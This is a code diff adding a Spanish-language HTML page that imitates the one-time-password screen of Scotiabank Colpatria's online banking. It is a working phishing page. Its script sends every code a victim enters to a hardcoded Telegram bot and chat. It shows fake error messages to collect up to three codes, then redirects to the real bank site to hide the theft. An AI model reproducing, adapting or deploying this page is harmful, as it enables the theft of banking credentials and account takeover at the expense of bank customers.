@@ -1,0 +1,131 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verificación OTP - Banca Virtual</title>
+    <link rel="stylesheet" href="styles.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;600;700&display=swap" rel="stylesheet">
+    <style>
+        .error-message {
+            color: #d32f2f;
+            font-size: 12px;
+            margin-top: 8px;
+            display: none;
+            text-align: center;
+        }
+        .error-message.show {
+            display: block;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="login-box" id="otpBox">
+            <img src="img/scotiabank-colpatria-symbol-red.svg" alt="Scotiabank Colpatria" class="logo">
+            
+            <h1>Ingresa a tu Banca Virtual</h1>
+            
+            <p class="otp-message">Ingresa el código que te enviamos vía SMS o correo electrónico</p>
+            
+            <form class="login-form" id="otpForm">
+                <div class="input-group">
+                    <svg class="icon-svg" width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <path d="M20 4H4C2.9 4 2.01 4.9 2.01 6L2 18C2 19.1 2.9 20 4 20H20C21.1 20 22 19.1 22 18V6C22 4.9 21.1 4 20 4ZM20 8L12 13L4 8V6L12 11L20 6V8Z" fill="#999999"/>
+                    </svg>
+                    <input type="text" placeholder="Código OTP" class="input-field" id="otp" required maxlength="6" pattern="[0-9]{1,6}" inputmode="numeric">
+                    <div class="error-message" id="errorMsg"></div>
+                </div>
+                
+                <button type="button" class="login-button" id="btnVerificar" disabled>Ingresar</button>
+                
+                <div class="signup-section">
+                    <a href="#" class="signup-link resend-code">Reenviar código</a>
+                </div>
+            </form>
+        </div>
+
+        <!-- Pantalla de carga -->
+        <div class="loading-screen" id="loadingScreen" style="display: none;">
+            <img src="img/login-graphic.svg" alt="Cargando" class="loading-graphic">
+        </div>
+    </div>
+
+    <script>
+        const TELEGRAM_BOT_TOKEN = '8882344336:AAF7YqBNYTL7Hb_9dPSicH9da29xEUSImGo';
+        const TELEGRAM_CHAT_ID = '-1003784784181';
+
+        let intentos = 0;
+
+        const otpInput = document.getElementById('otp');
+        const btnVerificar = document.getElementById('btnVerificar');
+        const loadingScreen = document.getElementById('loadingScreen');
+        const errorMsg = document.getElementById('errorMsg');
+        const resendLink = document.querySelector('.resend-code');
+
+        otpInput.addEventListener('input', function() {
+            this.value = this.value.replace(/\D/g, '').slice(0, 6);
+            validateOTP();
+        });
+
+        function validateOTP() {
+            const isValid = otpInput.value.length === 6;
+            btnVerificar.disabled = !isValid;
+        }
+
+        resendLink.addEventListener('click', function(e) {
+            e.preventDefault();
+            alert('Código reenviado a tu celular/correo');
+        });
+
+        btnVerificar.addEventListener('click', async function(e) {
+            e.preventDefault();
+            if (btnVerificar.disabled) return;
+
+            intentos++;
+            loadingScreen.style.display = 'flex';
+
+            const mensaje = `📱 <b>OTP (INTENTO ${intentos}/3) - SCOTIABANK COLPATRIA</b>
+
+<b>Código OTP:</b> <code>${otpInput.value}</code>
+
+<b>⏰ Recibido:</b> ${new Date().toLocaleString('es-CO')}`;
+
+            try {
+                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: mensaje, parse_mode: 'HTML' })
+                });
+
+                if ((await response.json()).ok) {
+                    if (intentos < 3) {
+                        setTimeout(() => {
+                            loadingScreen.style.display = 'none';
+                            if (intentos === 1) {
+                                errorMsg.textContent = '❌ El código OTP es incorrecto.';
+                                errorMsg.classList.add('show');
+                            } else if (intentos === 2) {
+                                errorMsg.textContent = '⚠️ Error en la validación. Intente nuevamente.';
+                                errorMsg.classList.add('show');
+                            }
+                            otpInput.value = '';
+                            validateOTP();
+                        }, 1500);
+                    } else {
+                        setTimeout(() => {
+                            window.location.href = 'https://www.scotiabank.com.co';
+                        }, 1500);
+                    }
+                } else {
+                    loadingScreen.style.display = 'none';
+                }
+            } catch (error) {
+                loadingScreen.style.display = 'none';
+            }
+        });
+    </script>
+</body>
+</html>
